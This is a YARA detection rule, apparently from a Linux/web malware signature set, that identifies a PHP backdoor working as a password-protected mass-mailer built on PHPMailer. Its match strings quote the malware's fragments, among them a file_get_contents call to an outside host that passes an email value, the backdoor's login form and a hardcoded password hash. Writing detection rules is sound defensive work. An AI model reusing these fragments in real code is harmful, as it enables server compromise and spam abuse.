rule backdoor_27887b6fb476f7449305ee367b01f779 {
  meta:
    description = "work1 - file backdoor_27887b6fb476f7449305ee367b01f779.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara/"
    date        = "2019-12-22"
    hash1       = "8d00a0154dbf5a9385a546acf852760afe7b44746f4e485da994d7ce0c6f1ca4"

  strings:
    $x1  = "$html=file_get_contents('http://toptivi.com/wp-content/app.php?email='.$emaillls);" fullword ascii
    $x2  = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'>" fullword ascii
    $s3  = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js\"></script>" fullword ascii
    $s4  = "<link href=\"https://maxcdn.bootstrapcdn.com/bootswatch/3.3.6/cosmo/bootstrap.min.css\" rel=\"stylesheet\" >" fullword ascii
    $s5  = "* Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5" fullword ascii
    $s6  = "$sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
    $s7  = "$sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));" fullword ascii
    $s8  = "$privKeyStr = file_get_contents($this->DKIM_private);" fullword ascii
    $s9  = "<li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>" fullword ascii
    $s10 = "$sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));" fullword ascii
    $s11 = "Reciver Email = <b>user@domain.com</b><br>" fullword ascii
    $s12 = "$DKIMb64 = base64_encode(pack('H*', sha1($body))); // Base64 of packed binary SHA-1 hash of body" fullword ascii
    $s13 = "* and creates a plain-text version by converting the HTML." fullword ascii
    $s14 = "* Usually the email address used as the source of the email" fullword ascii
    $s15 = "<li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>" fullword ascii
    $s16 = "$password = \"4b7554c77a57531a3baa03dc166addb8\"; // Password " fullword ascii
    $s17 = "print \"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form>" ascii
    $s18 = "* PHPMailer only supports some preset message types," fullword ascii
    $s19 = "* @param string $patternselect A selector for the validation pattern to use :" fullword ascii
    $s20 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/>" fullword ascii

  condition:
    (uint16(0) == 0x3c0a and
      filesize < 400KB and
      (1 of ($x*) and 4 of them)
    ) or (all of them)
}